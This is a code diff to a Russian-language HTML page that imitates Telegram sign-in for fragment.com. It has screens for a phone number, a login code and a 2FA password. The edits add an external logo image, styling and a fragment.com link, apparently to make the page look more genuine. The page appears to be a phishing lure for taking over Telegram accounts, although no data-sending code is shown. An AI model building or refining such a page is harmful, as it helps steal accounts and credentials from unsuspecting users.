@@ -42,13 +42,17 @@
             width: 64px;
             height: 64px;
             margin: 0 auto 12px;
-            background-color: #3390ec;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
-            font-size: 28px;
+            overflow: hidden;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         h1 {
@@ -131,6 +135,21 @@
             color: #707579;
             margin-top: 16px;
             text-align: center;
+        }
+
+        .fragment-link {
+            color: #3390ec;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .fragment-link:hover {
+            text-decoration: underline;
+        }
+
+        .fragment-text {
+            color: #3390ec;
+            font-weight: 500;
         }
         
         .buttons {
@@ -386,9 +405,11 @@
     <!-- Основной экран ввода телефона -->
     <div class="container" id="phoneScreen">
         <div class="header">
-            <div class="logo">T</div>
+            <div class="logo">
+                <img src="https://habrastorage.org/getpro/geektimes/post_images/d67/a9c/7dc/d67a9c7dc9801474767d47660640626c.jpg" alt="Logo">
+            </div>
             <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
-            <p class="subtitle">для fragment.com и Fragment Auction Alerts.</p>
+            <p class="subtitle">для <a href="https://fragment.com" class="fragment-link">fragment.com</a> и <span class="fragment-text">Fragment Auction Alerts</span>.</p>
             <p class="subtitle">Введите свой номер телефона в международном формате.</p>
             <p class="subtitle">Подтверждение будет отправлено в Telegram.</p>
         </div>
@@ -424,7 +445,9 @@
     <!-- Экран ввода кода подтверждения -->
     <div class="container hidden" id="codeScreen">
         <div class="header">
-            <div class="logo">T</div>
+            <div class="logo">
+                <img src="https://habrastorage.org/getpro/geektimes/post_images/d67/a9c/7dc/d67a9c7dc9801474767d47660640626c.jpg" alt="Logo">
+            </div>
             <h1 class="code-title">Введите код</h1>
         </div>
         
@@ -455,7 +478,9 @@
     <!-- Экран 2FA аутентификации -->
     <div class="container hidden" id="twoFAScreen">
         <div class="header">
-            <div class="logo">T</div>
+            <div class="logo">
+                <img src="https://habrastorage.org/getpro/geektimes/post_images/d67/a9c/7dc/d67a9c7dc9801474767d47660640626c.jpg" alt="Logo">
+            </div>
             <h1 class="password-title">2FA Аутентификация</h1>
         </div>
         
